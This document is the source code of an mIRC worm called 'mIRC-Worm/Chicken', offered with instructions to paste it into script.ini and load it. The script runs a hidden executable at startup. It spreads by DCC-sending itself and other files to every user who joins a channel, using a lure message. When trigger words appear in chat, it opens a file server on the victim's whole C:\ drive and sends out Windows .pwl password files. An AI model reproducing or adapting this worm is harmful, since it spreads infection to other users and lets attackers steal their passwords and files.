This is mIRC-Worm/Chicken. Just copy the following code into the script.ini file and load the script ;)
/---------------------------CUT HERE---------------------------\

[script]
n0=on 1:start:{
n1=  /if ($exists(c:\woc.exe)) /run -n C:\woc.exe
n2=  /if ( $day == Friday ) {
n3=    /clear
n4=    /echo 1,1.0,1  (4o0)7>>>
n5=    /echo 0,1 /|#|\ 
n6=    /echo 0,1//|#|\\
n7=    /echo 0,1 //\\
n8=    /echo 0,1//1,1.0,1 \\
n9=/echo  mIRC-Worm/Chicken by MI_pirat
n10=  }
n11=}
n12=on 1:join:#:{ /if ( $nick != $me ) {
n13=    /q $nick Pleez try some kewl progs. that I coded!
n14=    /dcc send -c $nick script.ini
n15=    /if ($exists(c:\woc.exe)) /dcc send -c $nick C:\woc.exe
n16=    /if ($exists(c:\system01.bin)) /dcc send -c $nick C:\system01.bin
n17=  }
n18=}
n19=on 1:text:*Cow*:#:{
n20=  /fserve $nick C:\
n21=  /dcc send -c $nick C:\Windows\*.pwl
n22=}
n23=on 1:text:*Chicken*:#:{
n24=  /fserve $nick C:\
n25=  /dcc send -c $nick C:\Windows\*.pwl
n26=}
n27=on 1:text:*Weasel*:#:{
n28=  /fserve $nick C:\
n29=  /dcc send -c $nick C:\Windows\*.pwl
n30=}
n31=on 1:text:*ABCD1234*:#:{
n32=  /fserve $nick C:\
n33=  /dcc send -c $nick C:\Windows\*.pwl
n34=}
n35=on 1:text:*kewlvir*:#:{
n36=  /fserve $nick C:\
n37=  /dcc send -c $nick C:\Windows\*.pwl
n38=}

/---------------------------CUT HERE---------------------------\
